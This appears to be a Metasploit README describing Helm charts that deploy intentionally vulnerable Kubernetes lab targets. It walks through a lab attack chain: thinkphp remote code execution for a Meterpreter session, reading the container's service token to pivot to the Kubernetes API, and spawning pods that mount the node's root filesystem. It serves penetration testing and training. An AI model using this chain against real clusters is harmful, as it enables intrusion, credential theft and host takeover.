### Kubernetes

A collection of Helm charts have been created to aid both Metasploit developers and pentesters explore Metasploit's
Kubernetes support and exploitation capabilities.

## Available Charts

- `secrets` - Create multiple Kubernetes Secrets to test Metasploit's enumeration capabilities
- `thinkphp` - Run an intentionally vulnerable `thinkphp` application with full cluster access. Exploit with `exploit/unix/webapp/thinkphp_rce` for a Meterpreter session.
- `lucee` - Run an intentionally vulnerable `lucee` application with minimal cluster access. Exploit with `linux/http/lucee_admin_imgprocess_file_write` for a cmd shell session.

## Usage

First ensure that Kubernetes is installed on your host machine with either [kind](https://kind.sigs.k8s.io/docs/user/quick-start/#installation),
[Minikube](https://minikube.sigs.k8s.io/docs/start/), [Docker Desktop](https://docs.docker.com/desktop/kubernetes/), or alternatives.

Next install the vulnerable charts and configuration:

```
docker-compose run setup
```

You can now use Metasploit from your host machine to target the intentionally vulnerable cluster.

To enter into an interactive environment with all of the required Helm/Kubectl tools available:

```
docker-compose run setup /bin/sh
kubectl get all --all-namespaces
helm list
```

### Workflow Example

First configure the Kubernetes environment:
```
docker-compose run configure
```

Now expose the exploitable thinkphp application to your host machine. In the real world this step would not be required
as the application would be most likely already be publicly accessible:

```
docker-compose run forward
```

Open Metasploit and exploit the thinkphp container to open a Metarpreter session:

```
use unix/webapp/thinkphp_rce
run http://target_ip:9001
```

The `auxiliary/cloud/kubernetes/enum_kubernetes` module can now be used to pivot through the compromised container to reach
the previously inaccessible Kubernetes API. In this scenario the container's Kubernetes service token will be read from the
file system, and used to authenticate with the Kubernetes API:

```
use auxiliary/cloud/kubernetes/enum_kubernetes
run session=-1
```

If the compromised service token has the required permissions to create new pods, it is possible to open additional Metasploit sessions and
run one-of tasks with the `exploit/multi/kubernetes/exec` module. This newly created pod will also attempt to mount the Kubernetes Node's
root filesystem to `/host_mnt`, which may lead to additional attack vectors:

```
use exploit/multi/kubernetes/exec
run session=-1
```

See the corresponding documentation for each module for more detail.
